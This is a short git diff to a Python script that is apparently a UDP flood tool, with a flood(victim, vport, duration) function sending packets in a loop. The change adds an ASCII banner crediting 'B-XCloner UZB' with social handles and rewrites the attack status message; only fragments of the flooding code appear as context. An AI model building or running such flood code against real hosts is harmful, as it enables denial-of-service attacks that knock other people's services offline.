@@ -6,6 +6,25 @@ import sys
 import os
 def usage():
     os.system("figlet Anonymous")
+    print('''
+		 ____________________________________________
+		|					                         |
+		|          The Code By :- B-XCloner UZB      |
+		|	       telegram channel :- @bxcloner     |
+		+--------------------------------------------+
+		|                                            |
+		|       Git Hub :- github.com/bbxcelonherr   |
+		|____________________________________________| 
+		|                                            |
+		|    Dunyoning asl haqiqati - sening bu      |
+		|       haqiqatni bilmasligingdadir:)        |
+		|                                            |
+		|                    By B-XCloner            |
+		|____________________________________________|
+	
+
+
+''')
     print ("		Code By B-XCloner")
     print ('''
     use :
@@ -26,7 +45,7 @@ def flood(victim, vport, duration):
             pass
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print ("Attacking  %s sent packages %s at the port %s "%(sent, victim, vport))
+        print ("Cyber attack is for B-XCLoner  %s sent packages %s at the port %s "%(sent, victim, vport))
 
 def main():
     if len(sys.argv) != 4:
